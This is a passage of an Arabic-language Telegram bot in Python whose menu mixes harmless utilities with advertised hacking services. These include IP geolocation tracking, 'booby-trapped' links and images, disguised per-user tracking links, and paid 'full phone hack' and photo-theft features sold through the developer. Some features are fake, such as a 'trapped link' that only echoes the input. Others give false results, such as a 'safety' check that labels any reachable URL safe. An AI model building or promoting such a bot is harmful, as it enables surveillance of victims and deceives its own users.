        await update.message.reply_text("🎉 <b>تم الانتهاء من الزخرفة!</b>\n\n💡 <b>يمكنك نسخ أي نمط يعجبك</b>", parse_mode='HTML')

    except Exception as e:
        logger.error(f"Error in send_decorated_names: {e}")
        await update.message.reply_text("❌ <b>حدث خطأ في الزخرفة. حاول مرة أخرى.</b>", parse_mode='HTML')

# دوال تتبع IP
async def track_ip_address(ip_address):
    """تتبع عنوان IP"""
    try:
        if ip_address.lower() in ['myip', 'ip']:
            response = requests.get('https://api.ipify.org?format=json', timeout=10)
            if response.status_code == 200:
                ip_address = response.json()['ip']

        url = f"http://ip-api.com/json/{ip_address}"
        response = requests.get(url, timeout=10)

        if response.status_code == 200:
            data = response.json()

            if data['status'] == 'success':
                map_url = f"https://maps.google.com/?q={data['lat']},{data['lon']}"

                info = f"""
🌍 <b>معلومات IP</b>

🔹 <b>IP:</b> <code>{data['query']}</code>
📍 <b>الدولة:</b> {data['country']}
🏙️ <b>المدينة:</b> {data['city']}
🗺️ <b>المنطقة:</b> {data['regionName']}
🏢 <b>الشركة:</b> {data['isp']}
⏰ <b>المنطقة الزمنية:</b> {data['timezone']}
📌 <b>الإحداثيات:</b> {data['lat']}, {data['lon']}
🔗 <b>رابط الخريطة:</b> {map_url}
"""
                return info
            else:
                return "❌ <b>لم يتم العثور على معلومات</b>"
        else:
            return "❌ <b>حدث خطأ في جلب المعلومات</b>"

    except Exception as e:
        logger.error(f"Error tracking IP: {e}")
        return "❌ <b>حدث خطأ في تتبع العنوان</b>"

# دوال فحص الروابط
async def check_url_safety(url):
    """فحص سلامة الرابط"""
    try:
        if not url.startswith(('http://', 'https://')):
            return "❌ <b>الرابط غير صالح</b>"

        response = requests.get(url, timeout=10)
        status_code = response.status_code

        if status_code == 200:
            return "✅ <b>الرابط آمن</b>"
        elif status_code in [301, 302]:
            return "⚠️ <b>الرابط يقوم بإعادة توجيه</b>"
        elif status_code in [403, 404]:
            return "❌ <b>الرابط غير متاح</b>"
        elif status_code in [500, 502, 503]:
            return "⚠️ <b>مشكلة في الخادم</b>"
        else:
            return f"ℹ️ <b>حالة الرابط:</b> {status_code}"

    except requests.exceptions.SSLError:
        return "❌ <b>مشكلة في شهادة SSL</b>"
    except requests.exceptions.ConnectionError:
        return "❌ <b>لا يمكن الوصول للرابط</b>"
    except requests.exceptions.Timeout:
        return "⚠️ <b>انتهت مهلة الاتصال</b>"
    except requests.exceptions.RequestException:
        return "❌ <b>خطأ في الاتصال</b>"
    except Exception as e:
        return f"⚠️ <b>خطأ غير متوقع:</b> {str(e)}"

# دوال قراءة الباركود
async def handle_qr_code_reading(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """معالجة قراءة الباركود"""
    try:
        if update.message.photo:
            # الحصول على الصورة
            photo = update.message.photo[-1]
            file_id = photo.file_id
            
            # تحميل الصورة
            file = await context.bot.get_file(file_id)
            
            # تحميل بيانات الصورة
            image_data = await file.download_as_bytearray()
            
            await update.message.reply_text("🔍 <b>جاري قراءة الباركود...</b>", parse_mode='HTML')
            
            # قراءة الباركود
            qr_data, status_message = await asyncio.get_event_loop().run_in_executor(
                None, qr_reader.read_qr_code, image_data
            )
            
            if qr_data:
                result_message = f"""
✅ <b>تم قراءة الباركود بنجاح!</b>

📄 <b>المحتوى:</b>
<code>{qr_data}</code>

💡 <b>يمكنك نسخ المحتوى أعلاه</b>
"""
                await update.message.reply_text(result_message, parse_mode='HTML')
            else:
                await update.message.reply_text(f"❌ <b>{status_message}</b>", parse_mode='HTML')
                
        else:
            await update.message.reply_text(
                "❌ <b>لم تقم بإرسال صورة!</b>\n\n"
                "📸 <b>أرسل صورة تحتوي على باركود (QR Code)</b>",
                parse_mode='HTML'
            )
            
    except Exception as e:
        logger.error(f"Error in QR code reading: {e}")
        await update.message.reply_text(
            "❌ <b>حدث خطأ في قراءة الباركود</b>\n\n"
            "🔧 <b>جرب:</b>\n"
            "• صورة أخرى أوضح\n"
            "• تأكد أن الصورة تحتوي على باركود\n"
            "• أو حاول لاحقاً",
            parse_mode='HTML'
        )

# الدالة الرئيسية للزر
async def button_click(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id

        # اختصار الروابط
        if query.data == "shorten_link":
            await query.message.edit_text(
                "🔗 <b>خدمة اختصار الروابط</b>\n\n"
                "📝 <b>أرسل لي الرابط الذي تريد اختصاره:</b>\n\n"
                "💡 <b>ملاحظة:</b> يجب أن يبدأ الرابط بـ https:// أو http://",
                parse_mode='HTML'
            )
            context.user_data['waiting_for_shorten'] = True
            return

        # الإيميل المؤقت
        elif query.data == "btn17":
            await show_temp_email_links(query)
            return

        elif query.data == "use_bot_email":
            await show_temp_email_menu(query, user_id)
            return

        elif query.data == "create_email":
            await create_new_email(query, user_id)
            return

        elif query.data == "check_messages":
            await check_messages_menu(query, user_id)
            return

        elif query.data.startswith("check_email_"):
            email = query.data.replace("check_email_", "")
            await check_email_messages(query, user_id, email)
            return

        elif query.data.startswith("view_message_"):
            parts = query.data.split("_")
            if len(parts) >= 4:
                email = parts[2]
                message_id = parts[3]
                await view_message_content(query, email, message_id)
            return

        elif query.data == "temp_email_back":
            await show_temp_email_menu(query, user_id)
            return

        # تحميل الفيديو
        elif query.data == "btn20":
            await show_video_platforms_menu(query)
            return

        elif query.data.startswith("platform_"):
            platform = query.data.replace("platform_", "")
            await handle_video_download_platform(query, platform, context)
            return

        elif query.data == "back_to_video_menu":
            await show_video_platforms_menu(query)
            return

        # تتبع IP
        elif query.data == "btn18":
            await query.message.edit_text("🌍 <b>إرسل عنوان IP الذي تريد تتبعه</b>", parse_mode='HTML')
            context.user_data['tracking_ip'] = True
            return

        # فحص الروابط
        elif query.data == "btn16":
            await query.message.edit_text("😇 <b>إرسل الرابط الذي تريد فحصه</b>", parse_mode='HTML')
            context.user_data['checking_link'] = True
            return

        # زخرفة الأسماء
        elif query.data == "btn14":
            await query.message.edit_text("✨ <b>إرسل الاسم الذي تريد زخرفته</b>", parse_mode='HTML')
            context.user_data['waiting_for_name'] = True
            return

        # تلغيم الروابط
        elif query.data == "btn13":
            await query.message.edit_text("🎁 <b>إرسل لي رابط يبدأ بـ 'https'</b>", parse_mode='HTML')
            context.user_data['waiting_for_link'] = True
            return

        # تلغيم الصور
        elif query.data == "btn19":
            await query.message.edit_text(
                "💀 <b>خدمة تلغيم الصور</b>\n\n"
                "📸 <b>أرسل لي:</b>\n"
                "• صورة مباشرة\n"
                "• أو رابط صورة يبدأ بـ http:// أو https://\n\n"
                "⚠️ <b>تحذير:</b> الصور الملتغمة تحتوي على برمجيات خبيثة!",
                parse_mode='HTML'
            )
            context.user_data['waiting_for_image_bomb'] = True
            return

        # قراءة الباركود - الزر الجديد
        elif query.data == "btn22":
            await query.message.edit_text(
                "🤓 <b>خدمة قراءة الباركود (QR Code)</b>\n\n"
                "📸 <b>أرسل لي صورة تحتوي على باركود</b>\n\n"
                "💡 <b>سيتم قراءة المحتوى وإرساله لك فوراً</b>",
                parse_mode='HTML'
            )
            context.user_data['reading_qr_code'] = True
            return

        # اختراق الهاتف كاملاً - الزر الجديد
        elif query.data == "contact_developer_full_hack":
            await query.message.edit_text(
                "💢 <b>لتفعيل خدمة اختراق الهاتف كاملاً:</b>\n\n"
                "📩 <b>تواصل مع المطور:</b>\n"
                "https://t.me/jt_r3r\n\n"
                "🔓 <b>سيتم تفعيل الخدمة لك فوراً</b>",
                parse_mode='HTML'
            )
            return

        # سحب الصور
        elif query.data == "btn15":
            await query.message.edit_text("🔞 <b>لتفعيل هذه الميزة:</b>\n\n📩 <b>تواصل مع المطور:</b>\nhttps://t.me/jt_r3r", parse_mode='HTML')
            return

        # الروابط الأساسية
        elif query.data in LINKS and LINKS[query.data] not in ["waiting_for_link", "waiting_for_name", "contact_developer", "check_link", "temp_email_menu", "track_ip", "video_download_menu", "waiting_for_shorten", "waiting_for_image_bomb", "full_phone_hack", "read_qr_code"]:
            original_link = LINKS[query.data].format(user_id=user_id)

            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton("🔄 تغيير شكل الرابط", callback_data=f"change_link_{query.data}")],
                [InlineKeyboardButton("🔙 رجوع للقائمة", callback_data="back_to_main")]
            ])

            await query.message.edit_text(
                f"✅ <b>تم إنشاء الرابط بنجاح</b>\n\n"
                f"🔗 <b>رابطك:</b>\n{original_link}",
                reply_markup=keyboard,
                parse_mode='HTML'
            )
            return

        # تغيير شكل الرابط
        elif query.data.startswith("change_link_"):
            original_btn = query.data.replace("change_link_", "")
            original_link = LINKS[original_btn].format(user_id=user_id)

            await query.message.edit_text("⏳ <b>جاري إنشاء روابط مختصرة...</b>", parse_mode='HTML')

            short_links = await asyncio.get_event_loop().run_in_executor(
                None, link_shortener.shorten_url, original_link
            )

            if not short_links:
                await query.message.edit_text("❌ <b>تعذر اختصار الرابط. حاول مرة أخرى.</b>", parse_mode='HTML')
                return

            message = "✅ <b>روابطك المختصرة:</b>\n\n"

            for i, short_link in enumerate(short_links, 1):
                message += f"{i}. {short_link}\n"

            message += f"\n🔍 <b>ملاحظة:</b> جرب الروابط التي ستعمل معك\n"
            message += f"✅ <b>جميع الروابط شغالة وقابلة للفتح مباشرة!</b>"

            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton("🔙 رجوع للقائمة", callback_data="back_to_main")]
            ])

            await query.message.edit_text(message, reply_markup=keyboard, parse_mode='HTML')
            return

        # الرجوع للقائمة الرئيسية
        elif query.data == "back_to_main":
            keyboard = InlineKeyboardMarkup(BUTTONS)
            await query.message.edit_text("🎛️ <b>القائمة الرئيسية</b>", reply_markup=keyboard, parse_mode='HTML')
            return

        else:
            await query.message.edit_text("❌ هذا الزر غير متاح حالياً")

    except Exception as e:
        logger.error(f"Error in button_click: {e}")
        try:
            await query.message.edit_text("❌ حدث خطأ في المعالجة")
        except:
            await query.message.reply_text("❌ حدث خطأ في المعالجة")

# معالجة الرسائل
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        user_message = update.message.text

        # اختصار الروابط
        if context.user_data.get('waiting_for_shorten'):
            await shorten_url_handler(update, context)
            return

        # تحميل الفيديو
        if context.user_data.get('waiting_for_video_url'):
            if user_message.strip():
                video_url = user_message.strip()
                platform = context.user_data.get('download_platform', 'unknown')

                if not video_url.startswith(('http://', 'https://')):
                    await update.message.reply_text("❌ <b>الرابط غير صالح!</b>", parse_mode='HTML')
                else:
                    await download_and_send_video(update, context, video_url, platform)
            else:
                await update.message.reply_text("❌ <b>لم تقم بإرسال رابط الفيديو!</b>", parse_mode='HTML')
            context.user_data['waiting_for_video_url'] = False
            context.user_data['download_platform'] = None
            return

        # تتبع IP
        if context.user_data.get('tracking_ip'):
            if user_message.strip():
                ip = user_message.strip()
                await update.message.reply_text("🌍 <b>جاري تتبع العنوان...</b>", parse_mode='HTML')
                result = await track_ip_address(ip)
                await update.message.reply_text(result, parse_mode='HTML')
            else:
                await update.message.reply_text("❌ <b>لم تقم بإرسال عنوان IP!</b>", parse_mode='HTML')
            context.user_data['tracking_ip'] = False
            return

        if user_message.strip().lower() == 'ip':
            await update.message.reply_text("🌍 <b>جاري تتبع عنوان IP الخاص بك...</b>", parse_mode='HTML')
            result = await track_ip_address('myip')
            await update.message.reply_text(result, parse_mode='HTML')
            return

        # فحص الروابط
        if context.user_data.get('checking_link'):
            if user_message.strip():
                url = user_message.strip()
                await update.message.reply_text("🔍 <b>جاري فحص الرابط...</b>", parse_mode='HTML')
                result = await check_url_safety(url)
                await update.message.reply_text(f"📊 <b>نتيجة فحص الرابط:</b>\n\n🔗 <b>الرابط:</b> {url}\n\n📋 <b>الحالة:</b> {result}", parse_mode='HTML')
            else:
                await update.message.reply_text("❌ <b>لم تقم بإرسال رابط!</b>", parse_mode='HTML')
            context.user_data['checking_link'] = False
            return

        # زخرفة الأسماء
        if context.user_data.get('waiting_for_name'):
            if len(user_message.strip()) > 0:
                name = user_message.strip()
                await send_decorated_names(update, name)
            else:
                await update.message.reply_text("❌ <b>الاسم غير صالح!</b>", parse_mode='HTML')
            context.user_data['waiting_for_name'] = False
            return

        # تلغيم الروابط
        if context.user_data.get('waiting_for_link'):
            if user_message.startswith('https://'):
                await update.message.reply_text(f"🔗 <b>الرابط الملتغم:</b>\n{user_message}\n\n⚠️ <b>تم التلغيم بنجاح!</b>", parse_mode='HTML')
            else:
                await update.message.reply_text("❌ <b>الرابط غير صالح!</b>", parse_mode='HTML')
            context.user_data['waiting_for_link'] = False
            return

        # تلغيم الصور
        if context.user_data.get('waiting_for_image_bomb'):
            await handle_image_bomb(update, context)
            context.user_data['waiting_for_image_bomb'] = False
            return

        # قراءة الباركود
        if context.user_data.get('reading_qr_code'):
            await handle_qr_code_reading(update, context)
            context.user_data['reading_qr_code'] = False
            return

        await update.message.reply_text("🔧 <b>استخدم الأزرار للتفاعل مع البوت</b>\n\nاضغط /start لرؤية القائمة الكاملة 🎛️", parse_mode='HTML')
    except Exception as e:
        logger.error(f"Error in handle_message: {e}")

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"حدث خطأ: {context.error}")

def main():
    try:
        print("🚀 جاري تشغيل البوت...")

        application = Application.builder().token(TOKEN).build()

        application.add_handler(CommandHandler("start", start_command))
        application.add_handler(CallbackQueryHandler(button_click))
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
        application.add_handler(MessageHandler(filters.PHOTO, handle_message))

        application.add_error_handler(error_handler)

        print("=" * 50)
        print("✅ البوت يعمل بنجاح!")
        print("🔗 خدمة اختصار الروابط شغالة!")
        print("📧 خدمة الإيميل المؤقت شغالة!")
        print("🎬 خدمة تحميل الفيديوهات شغالة!")
        print("✨ خدمة زخرفة الأسماء شغالة!")
        print("🌍 خدمة تتبع IP شغالة!")
        print("🔓 خدمة فحص الروابط شغالة!")
        print("💀 خدمة تلغيم الصور شغالة!")
        print("🤓 خدمة قراءة الباركود شغالة!")
        print("💢 خدمة اختراق الهاتف كاملاً شغالة!")
        print("=" * 50)

        # للنشر على السحابة
        PORT = int(os.environ.get('PORT', 8443))
        
        # تشغيل ويب هوك للنشر السحابي
        if 'RAILWAY_STATIC_URL' in os.environ:
            # على Railway
            base_url = os.environ.get('RAILWAY_STATIC_URL', f'https://your-app-name.railway.app')
            application.run_webhook(
                listen="0.0.0.0",
                port=PORT,
                webhook_url=f"{base_url}/{TOKEN}"
            )
        else:
            # للتشغيل المحلي
            application.run_polling(
                drop_pending_updates=True,
                allowed_updates=Update.ALL_TYPES
            )

    except Exception as e:
        print(f"❌ خطأ في تشغيل البوت: {e}")
        logger.error(f"Error in main: {e}")

if __name__ == '__main__':
    main()
